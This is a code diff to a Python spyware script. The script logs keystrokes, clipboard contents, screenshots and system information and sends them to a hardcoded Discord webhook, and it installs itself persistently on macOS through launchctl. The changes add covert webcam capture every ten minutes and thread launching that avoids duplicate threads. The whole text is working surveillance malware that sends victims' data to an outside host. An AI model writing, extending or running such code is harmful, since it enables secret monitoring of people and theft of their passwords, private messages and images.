@@ -8,6 +8,7 @@ import threading
 import time
 from PIL import ImageGrab
 import clipboard
+import cv2
 
 # Your actual Discord Webhook URL
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1275636071421448254/yfVS5vYWNKMHnPvEKgRnB95EZ84MXzfoVxoY5ytgNLW6k_DKx3tCmP6nMvR22G-p6uZW'
@@ -59,7 +60,7 @@ def on_press(key):
             key_data = "[TAB]"
         if key_data == "Key.esc":
             key_data = "[ESC]"
-        logging.info(key_data)
+        logging.info(f"Key logged: {key_data}")
         send_to_discord(key_data)
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -139,11 +140,55 @@ def make_persistent():
         # Load the plist using launchctl (no sudo required)
         os.system(f"launchctl load {plist_path}")
 
+def capture_webcam():
+    while True:
+        try:
+            cam = cv2.VideoCapture(0)  # Open default webcam (0)
+            ret, frame = cam.read()  # Capture frame
+            if ret:
+                webcam_image_path = os.path.join(log_dir, "webcam.png")
+                cv2.imwrite(webcam_image_path, frame)  # Save image
+                send_to_discord("Webcam image captured", webcam_image_path)  # Send to Discord
+            cam.release()  # Release the webcam
+        except Exception as e:
+            print(f"An error occurred: {e}")
+        time.sleep(600)  # Wait 10 minutes before capturing another image
+
+# Modified capture_screenshot function to send both screenshots and webcam image simultaneously
+def capture_screenshot_and_webcam():
+    while True:
+        # Capture screenshot
+        screenshot = ImageGrab.grab()
+        screenshot_path = os.path.join(log_dir, "screenshot.png")
+        screenshot.save(screenshot_path)
+        send_to_discord("Screenshot captured", screenshot_path)
+        
+        # Capture webcam image
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if ret:
+            webcam_image_path = os.path.join(log_dir, "webcam.png")
+            cv2.imwrite(webcam_image_path, frame)
+            send_to_discord("Webcam image captured", webcam_image_path)
+        cam.release()  # Release the webcam
+
+        time.sleep(600)  # Capture every 10 minutes
+
+# Start threads for different functionalities
 if __name__ == "__main__":
-    get_system_info()  # Send system info to Discord
+    sent_system_info = False
+    if not sent_system_info:
+        get_system_info()  # Send system info to Discord
+        sent_system_info = True
+
     make_persistent()  # Make the script persistent
 
-    # Start threads for different functionalities
-    threading.Thread(target=start_keylogger).start()
-    threading.Thread(target=capture_screenshot).start()
-    threading.Thread(target=log_clipboard).start()
+    # Start threads for different functionalities if they are not already running
+    if not any(thread.name == "KeyloggerThread" for thread in threading.enumerate()):
+        threading.Thread(target=start_keylogger, name="KeyloggerThread").start()
+
+    if not any(thread.name == "ScreenshotThread" for thread in threading.enumerate()):
+        threading.Thread(target=capture_screenshot_and_webcam, name="ScreenshotThread").start()
+
+    if not any(thread.name == "ClipboardThread" for thread in threading.enumerate()):
+        threading.Thread(target=log_clipboard, name="ClipboardThread").start()
